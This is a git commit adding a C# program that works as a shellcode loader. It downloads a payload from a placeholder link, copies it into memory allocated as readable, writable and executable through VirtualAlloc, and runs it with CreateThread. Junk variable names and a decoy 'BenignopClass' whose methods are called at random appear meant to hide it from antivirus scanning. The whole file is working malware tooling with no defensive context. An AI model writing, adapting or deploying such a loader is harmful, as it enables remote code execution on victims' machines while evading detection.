4d390af590ee734b27b428605eb8efb3de2708f4
Bhrigu Shiravadakar <167758583+BhriguShiravadakar@users.noreply.github.com>
2024-05-23 15:48:08 +0800

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        string downloadLink = "[DOWNLOAD_LINK]"; // Replace 
+
+        WebClient wc = new WebClient();
+        byte[] sfhbsgjhgjghhbsjbvejs = wc.DownloadData(downloadLink);
+
+        IntPtr addr = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
+        VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(VirtualAllocDelegate));
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sfhbsgjhgjghhbsjbvejs.Length, 0x3000, 0x40);
+
+        Marshal.Copy(sfhbsgjhgjghhbsjbvejs, 0, mem, sfhbsgjhgjghhbsjbvejs.Length);
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+        dhdsfhbsgjhgjghhbsjbvejsfgdfg();
+    }
+
+    static void dhdsfhbsgjhgjghhbsjbvejsfgdfg()
+    {
+        MethodInfo[] methods = typeof(BenignopClass).GetMethods();
+        Random rand = new Random();
+        int index = rand.Next(methods.Length);
+        methods[index].Invoke(null, null);
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr LoadLibrary(string dllName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+
+class BenignopClass
+{
+    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg1()
+    {
+        Console.WriteLine("bfjdsfkjdshfdsdhdsfhbsgjhgjghhbsjbvejsfgdfg fdsfkdjsfhdsf.");
+    }
+
+    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg2()
+    {
+        Console.WriteLine("bfjdsfkjdshfddhdsfhbsgjhgjghhbsjbvejsfgdfgsop bfjdsfkjdshfds.");
+    }
+
+    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg3()
+    {
+        Console.WriteLine("bfjdsfkdhdsfhbsgjhgjghhbsjbvejsfgdfgjdshfdsYet d bfjdsfkjdshfds.");
+    }
+}
